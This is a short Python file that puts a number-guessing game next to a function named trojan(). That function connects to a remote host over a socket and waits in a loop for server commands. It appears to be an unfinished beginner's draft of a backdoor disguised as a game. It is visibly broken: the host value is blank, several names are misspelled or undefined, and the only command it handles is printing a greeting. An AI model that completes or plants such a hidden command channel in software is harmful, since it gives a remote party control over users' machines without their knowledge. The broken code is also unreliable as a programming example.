import random 
import socket 
import threading


def trojan():
    HOST = 
    port = 9090

    client = socket.socket(socker.AF_INET,socket.SOCK_STREAM)
    client.connect((HLOST,PORT))
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'hello':
            print("hello World!")
            client.send(f"{server_command} was executed successfully".encode('utf-8'))
def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Enter a guess:"))
        if guess == number:
            done = True
            print('You won!')
        else:
            tries += 1   
            if guess > number:
                print('the actuel numbrr is smaller ') 
            else:
                print('actuel number is larger')  
    print(f"You need {tries} tries")              